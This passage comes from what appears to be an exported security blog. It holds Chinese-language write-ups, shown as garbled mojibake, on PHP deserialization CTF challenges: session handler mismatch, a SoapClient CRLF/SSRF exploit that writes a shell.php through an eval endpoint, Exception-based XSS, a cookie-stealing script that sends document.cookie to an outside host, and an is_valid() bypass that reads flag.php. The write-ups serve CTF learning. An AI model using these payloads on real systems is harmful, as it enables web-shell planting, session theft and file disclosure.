<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611121136.png" alt=""></p>
<p>ä»phpinfoä¸­å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„æ ¹ç›®å½•åœ¨<code>/opt/lampp/htdocs</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611121239.png" alt=""></p>
<p>file_get_contents()è¯»å–æ–‡ä»¶</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611121429.png" alt=""></p>
<h3 id="æ–°æ˜¥æˆ˜å½¹2020-hackme">æ–°æ˜¥æˆ˜å½¹2020 hackme</h3>
<p>è´´ä¸Šå‡ºé¢˜çš„kaixinå¸ˆå‚…çš„writeupï¼š<a href="https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme">https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme</a></p>
<p>æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œè¿™é‡Œå°±ä¸»è¦è¯´è€ƒå¯Ÿåˆ°çš„çŸ¥è¯†ç‚¹ï¼š</p>
<h4 id="PHP-Sessionååºåˆ—åŒ–">PHP Sessionååºåˆ—åŒ–</h4>
<p><code>profile.php</code>ä¸­<code>session.serialize_handler</code>ç”¨çš„æ˜¯<code>php</code>ï¼Œè€Œ<code>init.php</code>ä¸­è®¾ç½®çš„æ˜¯<code>php_serialize</code>ï¼Œè¿™æ ·å°±å¯ä»¥å‚è€ƒå‰é¢æåˆ°çš„PHP Sessionååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h4 id="dataåè®®ä»¥åŠ4å­—å‘½ä»¤æ³¨å…¥">dataåè®®ä»¥åŠ4å­—å‘½ä»¤æ³¨å…¥</h4>
<p><a href="https://www.secpulse.com/archives/67064.html">æŒ–æ´æŠ€å·§ï¼šå¦‚ä½•ç»•è¿‡URLé™åˆ¶</a></p>
<p><a href="https://www.anquanke.com/post/id/87203">ã€CTF æ”»ç•¥ã€‘å¦‚ä½•ç»•è¿‡å››ä¸ªå­—ç¬¦é™åˆ¶getshell</a></p>
<p>è¿™ä¸ªè€ƒç‚¹éœ€è¦å¦å¤–å†™ä¸€ç¯‡æ•´ç†ä¸€ä¸‹ã€‚</p>
<h2 id="0x04-Reference">0x04 Reference</h2>
<table>
<thead>
<tr>
<th>Title</th>
<th>Url</th>
</tr>
</thead>
<tbody>
<tr>
<td>å¸¦ä½ èµ°è¿›PHP sessionååºåˆ—åŒ–æ¼æ´</td>
<td><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></td>
</tr>
<tr>
<td>PHPååºåˆ—åŒ–æ€»ç»“</td>
<td><a href="https://www.cnblogs.com/tr1ple/p/11156279.html#sna43nW4">https://www.cnblogs.com/tr1ple/p/11156279.html#sna43nW4</a></td>
</tr>
<tr>
<td>PHPååºåˆ—åŒ–å…¥é—¨ä¹‹sessionååºåˆ—åŒ–</td>
<td><a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#PHP%E7%9A%84session%E6%9C%BA%E5%88%B6">https://mochazz.github.io/2019/01/29/PHPååºåˆ—åŒ–å…¥é—¨ä¹‹sessionååºåˆ—åŒ–/#PHPçš„sessionæœºåˆ¶</a></td>
</tr>
<tr>
<td>GYCTF Hackme</td>
<td><a href="http://www.pdsdt.lovepdsdt.com/index.php/2020/03/09/187/#Hackme">http://www.pdsdt.lovepdsdt.com/index.php/2020/03/09/187/#Hackme</a></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>PHPååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–å­¦ä¹ â€”â€”åŸç”Ÿç±»åˆ©ç”¨</title>
    <url>/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="ä»ä¸¤é“CTFé¢˜ç›®å­¦ä¹ PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨">ä»ä¸¤é“CTFé¢˜ç›®å­¦ä¹ PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨</h1>
<p>æ–‡ç« å›´ç»•ç€ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•åœ¨åŸæœ¬çš„ä»£ç ä¸­æ‰¾ä¸åˆ°popé“¾çš„æ—¶å€™ï¼Œé€šè¿‡åŸç”Ÿç±»æ„é€ ååºåˆ—åŒ–æ¼æ´ï¼Ÿ</p>
<p>ä¸»è¦æ˜¯ä¸¤ä¸ªåŸç”Ÿç±»ï¼š</p>
<ul>
<li>SoapClient</li>
<li>Errorï¼ˆPHP7ï¼‰æˆ–Exceptionï¼ˆPHP5å’Œ7ï¼‰</li>
</ul>
<h2 id="SoapClient-CLRF-SSRF">SoapClient + CLRF +SSRF</h2>
<p>é¢˜ç›®ï¼š2018LCTF Bestphpâ€™s revenge</p>
<blockquote>
<p>SoapClientç±» ç”¨æ¥æä¾›å’Œä½¿ç”¨ webserviceã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public SoapClient::SoapClient(mixed $wsdl[,array$options])</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºWSDL æ–‡ä»¶çš„ URI ï¼Œå¦‚æœæ˜¯NULL æ„å‘³ç€ä¸ä½¿ç”¨ WSDL æ¨¡å¼ã€‚</p>
<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨WSDL æ¨¡å¼ä¸‹ï¼Œè¿™ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ã€‚å¦‚æœåœ¨non-WSDL æ¨¡å¼ä¸‹ï¼Œå¿…é¡»è®¾ç½®location å’Œ uri å‚æ•°ï¼Œlocationæ˜¯è¦è¯·æ±‚çš„ URLï¼Œuriæ˜¯è¦è®¿é—®çš„èµ„æºã€‚</p>
<p>åœ¨å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå®ƒçš„user_agent å‚æ•°æ˜¯å¯ä»¥æ§åˆ¶ HTTPå¤´éƒ¨çš„ User-Agent çš„ã€‚è€Œåœ¨HTTP åè®®ä¸­ï¼Œheader ä¸body æ˜¯ç”¨ä¸¤ä¸ª <code>\r\n</code>åˆ†éš”çš„ï¼Œæµè§ˆå™¨ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸¤ä¸ª \r\næ¥åŒºåˆ† header å’Œbody çš„ã€‚</p>
<blockquote>
<p>The <em>user_agent</em> option specifies string to use in <em>User-Agent</em> header.</p>
</blockquote>
<p>demoï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a= <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:20000/&#x27;</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">$x= newSoapClient(<span class="literal">NULL</span>,$a);</span><br><span class="line">$y= serialize($x);</span><br><span class="line">$z= unserialize($y);</span><br><span class="line">$z-&gt;no_func();</span><br></pre></td></tr></table></figure>
<p>ç›‘å¬æœ¬åœ°çš„20000ç«¯å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:20000</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP&#x2F;5.5.9-1ubuntu4.29</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;utf-8</span><br><span class="line">SOAPAction: &quot;user#no_func&quot;</span><br><span class="line">Content-Length: 371</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:ns1&#x3D;&quot;user&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:SOAP-ENC&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot; SOAP-ENV:encodingStyle&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:no_func&#x2F;&gt;&lt;&#x2F;SOAP-ENV:Body&gt;&lt;&#x2F;SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>
<p>çœ‹è¿™ä¸ªPOSTçš„è¯·æ±‚ï¼Œå‘ç°æœ‰ä¸¤ä¸ªåœ°æ–¹æ˜¯å¯æ§çš„ï¼Œ<code>User-Agent</code>å’Œ <code>SOAPAction</code>ï¼Œè€Œä¸”æ˜æ˜¾Content-Type å’Œ Content-Length éƒ½åœ¨User-Agent ä¹‹ä¸‹ï¼Œç”¨ wupco å¸ˆå‚…çš„payload å°±èƒ½è¿›è¡Œä»»æ„çš„ POSTè¯·æ±‚ï¼Œè¿™é‡Œè¦å…ˆ urldecode æ‰å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<p><code>exp.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target= <span class="string">&#x27;http://127.0.0.1/test.php&#x27;</span>;</span><br><span class="line">$post_string= <span class="string">&#x27;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#x27;</span>;</span><br><span class="line">$headers= <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;Cookie:admin=1&#x27;</span></span><br><span class="line">   );</span><br><span class="line">$b= <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length:&#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;peri0d&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa= serialize($b);</span><br><span class="line">$aaa= str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,$aaa);</span><br><span class="line">$aaa= str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span>$aaa;</span><br><span class="line"></span><br><span class="line">$x= unserialize(urldecode($aaa));</span><br><span class="line">$x-&gt;no_func();</span><br></pre></td></tr></table></figure>
<p><code>test.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">	@$a=$_POST[<span class="number">1</span>];</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥æˆåŠŸå†™å…¥<code>shell.php</code>ã€‚</p>
<h2 id="Error-Exception-XSS">Error/Exception + XSS</h2>
<p>é¢˜ç›®ï¼šBJDCTF 2rd XSSä¹‹å…‰</p>
<p>Gitæ³„éœ²ï¼Œç”¨GitHack dumpä¸‹æ¥ï¼š</p>
<p>åªæœ‰ä¸€ä¸ª<code>index.php</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ydsï¼Ÿï¼Ÿï¼Ÿæ¨å¤§æ ‘ï¼Ÿï¼Ÿï¼Ÿ</p>
</blockquote>
<p>Errorç±»å°±æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ª<code>Error</code>ï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ª<code>xss</code>æ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ª<code>toString</code>çš„æ–¹æ³•ã€‚</p>
<blockquote>
<p>Exceptionç±»è·ŸErrorç±»åŸç†ä¸€æ ·ï¼Œä½†æ˜¯ä¹Ÿé€‚ç”¨äºPHP5</p>
</blockquote>
<p>æˆ‘ä»¬å…ˆæ¥éªŒè¯ä¸€ä¸‹ï¼š</p>
<p>POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç¼–ç åçš„ååºåˆ—åŒ–ç»“æœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸè§¦å‘XSSã€‚</p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥æ‰“cookieï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s = <span class="string">&#x27;&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://f7ffa642-8f7f-4879-bc49-e75d26e7c2bc.node3.buuoj.cn/a?&quot;+escape(document.cookie);&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($s);</span><br></pre></td></tr></table></figure>
<h2 id="SimpleXMLElement">SimpleXMLElement</h2>
<p><a href="https://ca0y1h.top/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3/#SimpleXMLElementXXE%E6%BC%8F%E6%B4%9E">https://ca0y1h.top/code_audit/5.PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day3/#SimpleXMLElementXXEæ¼æ´</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>PHPååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–å­¦ä¹ -å­—ç¬¦é€ƒé€¸</title>
    <url>/Web_security/php_related/6.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="ä»ä¸€é“CTFé¢˜å­¦ä¹ PHPååºåˆ—åŒ–çš„å¯¹è±¡-å­—ç¬¦é€ƒé€¸">ä»ä¸€é“CTFé¢˜å­¦ä¹ PHPååºåˆ—åŒ–çš„å¯¹è±¡/å­—ç¬¦é€ƒé€¸</h1>
]]></content>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–å­¦ä¹ -CTFå®æˆ˜ç¯‡</title>
    <url>/Web_security/php_related/7.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CTF%E5%AE%9E%E6%88%98%E7%AF%87/</url>
    <content><![CDATA[<h1 id="PHPååºåˆ—åŒ–å­¦ä¹ ä¹‹CTFå®æˆ˜ç¯‡">PHPååºåˆ—åŒ–å­¦ä¹ ä¹‹CTFå®æˆ˜ç¯‡</h1>
<h2 id="ç½‘é¼æ¯2020-AreUserialz">ç½‘é¼æ¯2020 AreUserialz</h2>
<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<p>é¢˜ç›®ç›´æ¥ç»™å‡ºæºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¼±ç±»å‹æ¯”è¾ƒ">å¼±ç±»å‹æ¯”è¾ƒ</h3>
<p>åˆ†ææºç å‘ç°å¯ä»¥è°ƒç”¨çš„é­”æœ¯æ–¹æ³•åªæœ‰<code>__destruct</code>ã€‚è€Œ<code>$op=2</code>å¯ä»¥è¯»æ–‡ä»¶ï¼Œ<code>$op=1</code>å¯ä»¥å†™æ–‡ä»¶ï¼Œä½†æ˜¯å®ƒæŠŠ<code>$content</code>è®¾ç½®ä¸º0è¯´æ˜å†™è¿™ä¸ªæ“ä½œæ˜¯ç»å¯¹å®ç”¨ä¸äº†äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬æŠŠç›®å…‰æ”¾åœ¨è¯»æ–‡ä»¶ä¸Šã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥å¼±ç±»å‹æ¯”è¾ƒè®¾ç½®<code>$op=2</code>å°±å®Œäº‹äº†ã€‚ç„¶åæœ¬æ¥ä»¥ä¸ºå¯ä»¥ç›´æ¥æ„é€ <code>pop</code>é“¾å¼€å§‹è¯»æ–‡ä»¶çš„ã€‚ä½†æ˜¯é‡åˆ°äº†ä¸‹é¢çš„å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ¬æ¥è¿™é‡Œæ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜çš„ï¼Œä½†æ˜¯å› ä¸ºä½ çš„å˜é‡æ˜¯<code>protected</code>ç±»å‹çš„ï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿ<code>%00</code>å­—ç¬¦ï¼Œä»è€Œå¯¼è‡´ç»•è¿‡å¤±è´¥ã€‚</p>
<h3 id="ç»•è¿‡is-valid">ç»•è¿‡is_valid()</h3>
<p>è¿™é‡Œæœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼š</p>
<p>1.å¯ä»¥å°†<code>protected</code>ç±»å‹çš„å˜é‡è®¾ç½®ä¸º<code>public</code>ç±»å‹ï¼ˆPHP 7.0ä»¥ä¸Šï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
<p>2.ååºåˆ—åŒ–ä¹‹å‰ä¼šåšé€å­—åˆ¤æ–­ï¼Œasciiå¿…é¡»&gt;=32æˆ–&lt;=125ã€‚ç”±äºè¿™é‡Œæ˜¯<code>protected</code>ç±»å‹ï¼Œéœ€è¦åŠ ä¸Š%00è¿›è¡Œæ ‡è¯†ï¼Œä½†æ˜¯%ä¼šè¢«è¿‡æ»¤ï¼Œå°±ç”¨åå…­è¿›åˆ¶\00å’ŒSæ¥ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = urlencode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå°†payloadä¸­çš„<code>%00</code>æ›¿æ¢ä¸º<code>\00</code>ï¼Œ<code>s</code>æ›¿æ¢ä¸º<code>S</code>å°±è¡Œäº†</p>
